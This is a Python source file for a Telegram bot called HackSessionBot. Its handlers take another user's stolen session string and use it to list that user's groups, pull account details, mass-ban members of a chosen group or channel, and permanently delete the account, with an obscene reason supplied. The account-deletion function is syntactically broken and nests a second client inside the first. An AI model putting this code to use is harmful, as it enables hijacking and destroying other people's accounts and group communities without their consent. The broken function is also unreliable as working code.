import os
from HackSessionBot import app,API_ID,API_HASH
from pyrogram import filters , Client
from HackSessionBot.Helpers.steve import (
    users_gc,
    user_info,
    banall )
from HackSessionBot.Helpers.data import HACK_MODS 
from pyrogram.types import CallbackQuery 
from pyrogram.raw import functions

@app.on_callback_query(filters.regex("A"))
async def a_callback(client : Client , query : CallbackQuery):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ")
    ch = await users_gc(session.text)
    if len(ch) > 3855:
        file = open("session.txt", "w")
        file.write(ch)
        file.close()
        await client.send_document(chat_id, "session.txt")
        os.system("rm -rf session.txt")
    else:
        await query.message.reply_text(text = ch + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ , ɢɪᴠᴇ ᴀ sᴛᴀʀ ᴛᴏ ᴍʏ [ʀᴇᴘᴏ](https://github.com/SupremeStark/HackSessionBot)**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

    
@app.on_callback_query(filters.regex("B"))
async def b_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ.")
    info = await user_info(session.text)
    await query.message.reply_text(text = info + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ , ɢɪᴠᴇ ᴀ sᴛᴀʀ ᴛᴏ ᴍʏ [ʀᴇᴘᴏ](https://github.com/SupremeStark/HackSessionBot)**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("C"))
async def c_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ.")
    gc = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ/ᴄʜᴀɴɴᴇʟ ɪᴅ ᴏʀ ᴜsᴇʀɴᴀᴍᴇ") 
    hehe = await banall(session.text,gc)
    await query.message.reply_text(text = hehe + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ , ɢɪᴠᴇ ᴀ sᴛᴀʀ ᴛᴏ ᴍʏ [ʀᴇᴘᴏ](https://github.com/SupremeStark/HackSessionBot)**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

async def del_acc(session):
    async with Client("del",api_id = API_ID,api_hash = API_HASH, session_string = session) as app
        async with Client("my_account") as app:
            await app.invoke(
        functions.account.DeleteAccount(
            reason = "mai madarchod hu"
        )
    )
    return "Account deleted successfully"

@app.on_callback_query(filters.regex("J"))
async def c_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ ᴏғ ᴛʜᴀᴛ ᴜsᴇʀ.")    
    hehe = await del_acc(session.text)
    await query.message.reply_text(text = hehe + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ , ɢɪᴠᴇ ᴀ sᴛᴀʀ ᴛᴏ ᴍʏ [ʀᴇᴘᴏ](https://github.com/SupremeStark/HackSessionBot)**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)


